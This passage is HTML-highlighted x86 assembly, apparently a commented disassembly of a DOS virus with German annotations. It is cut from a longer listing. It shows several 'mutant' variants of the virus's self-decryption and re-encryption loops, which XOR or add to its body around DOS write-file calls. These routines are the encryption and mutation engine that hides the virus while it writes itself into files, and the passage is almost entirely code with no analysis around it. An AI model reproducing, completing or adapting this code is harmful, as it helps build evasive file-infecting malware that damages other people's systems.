                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03AAD</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03AC0</span><span class="sc0">            </span><span class="sc1">; SI = 4BB8</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03AB8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; =&gt; AH = 40, WRITE FILE</span><span class="sc0">
                </span><span class="sc1">;----------------( db-code )-------------------------</span><span class="sc0">
                </span><span class="sc5">Call_int21</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc5">MUT_3</span><span class="sc0">
                </span><span class="sc1">;----------------</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03A9B</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03AC0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D4BB5</span><span class="sc4">-</span><span class="sc2">4C40H</span><span class="sc0"> </span><span class="sc1">; SI = SI + 8Bh = 4C43h/D2433</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03ACB</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">             </span><span class="sc1">; originales SI vom Stack</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03ACB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc1">;----------------</span><span class="sc0">
</span><span class="sc5">J03ACD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">JMP_entry</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc5">mut_3</span><span class="sc0">
                </span><span class="sc1">;----------------</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #5 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_5</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J03AD0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0BD7h</span><span class="sc0">                </span><span class="sc1">; CX = 0bd7 ; = OFFSET 4BB5</span><span class="sc0">
</span><span class="sc5">J03AD3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">4096h</span><span class="sc0">  </span><span class="sc1">; also 11c3 mal, da BX um 3</span><span class="sc0">
                                                </span><span class="sc1">; erhîht wird</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03AD3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03B04</span><span class="sc0">

</span><span class="sc5">J03AE6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03AE7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03AED</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">J03AED</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">23A0h</span><span class="sc0">                </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0BD7h</span><span class="sc0">                </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; SI =</span><span class="sc0">

</span><span class="sc5">J03AF9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4096h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03AF9</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03B0C</span><span class="sc0">            </span><span class="sc1">; SI =</span><span class="sc0">


</span><span class="sc5">J03B04</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; AH = 40h !</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc5">MUT_5</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03AE6</span><span class="sc0">

</span><span class="sc5">J03B0C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0FF72h</span><span class="sc0">                </span><span class="sc1">; SI =</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03B17</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03B17</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03B18</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc5">mut_5</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 20 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_20</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">CMC</span><span class="sc0">                             </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03B61</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
</span><span class="sc5">J03B20</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0406h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">CMC</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03B20</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CMC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">,</span><span class="sc5">MUT_20</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03B5E</span><span class="sc0">                  </span><span class="sc1">; DS &lt;- 4BCF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   </span><span class="sc1">; BX &lt;- DS, BX = 4BCF !</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS=CS</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">               </span><span class="sc1">; BX = 2830</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03B61</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                </span><span class="sc1">; DX = 2</span><span class="sc0">
</span><span class="sc5">J03B46</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0406h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03B46</span><span class="sc0">
                                                </span><span class="sc1">; BX = 4BB6</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Dh</span><span class="sc0">                </span><span class="sc1">; BX = 4C43 / 2443</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; [BX]=[2443]  ????????</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX = ?</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">; CX = ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03B60</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">,</span><span class="sc5">mut_20</span><span class="sc0">

</span><span class="sc5">J03B5E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03B60</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03B61</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1100h</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">                 </span><span class="sc1">; CX = 11C3</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 21 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_21</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BAE</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
</span><span class="sc5">J03B6B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">239Ah</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03B6B</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc5">MUT_21</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BAB</span><span class="sc0">                  </span><span class="sc1">; DS &lt;- 4BCF</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   </span><span class="sc1">; BX = 4BCF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS = CS</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">               </span><span class="sc1">; BX = 2830</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BAE</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                </span><span class="sc1">; AX = 0002</span><span class="sc0">

</span><span class="sc5">J03B92</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">239Ah</span><span class="sc0">
                </span><span class="sc6">NOP</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03B92</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Dh</span><span class="sc0">                </span><span class="sc1">; BX = 4BB6</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc0">                      </span><span class="sc1">; CMP byte Ptr DS:[4C43],1</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03BAD</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc5">mut_21</span><span class="sc0">
                </span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc5">J03BAB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03BAD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03BAE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0C311h</span><span class="sc0">               </span><span class="sc1">; MOV CX,11C3</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                   </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 22 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_22</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BF9</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
</span><span class="sc5">J03BB7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0138h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03BB7</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc4">,</span><span class="sc5">MUT_22</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03BCB</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03BCB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BF6</span><span class="sc0">                  </span><span class="sc1">; DS &lt;-</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS = CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03BF9</span><span class="sc0">                  </span><span class="sc1">; CX = 11C3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                </span><span class="sc1">; AX = 0002</span><span class="sc0">

</span><span class="sc5">J03BDE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0138h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03BDE</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Dh</span><span class="sc0">                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03BF8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc4">,</span><span class="sc5">mut_22</span><span class="sc0">

</span><span class="sc5">J03BF6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03BF8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03BF9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0C311h</span><span class="sc0">                 </span><span class="sc1">; MOV CX,11C3</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">                    </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0CCh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 23 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_23</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">                   </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">94E0h</span><span class="sc0">                </span><span class="sc1">; CX=2385 -&gt; 8523 -&gt; 11c3</span><span class="sc0">
</span><span class="sc5">J03C06</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">00FEh</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03C06</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03C42</span><span class="sc0">

        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03C17</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03C1B</span><span class="sc0">
</span><span class="sc5">J03C1A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03C1B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">               </span><span class="sc1">; BX =</span><span class="sc0">
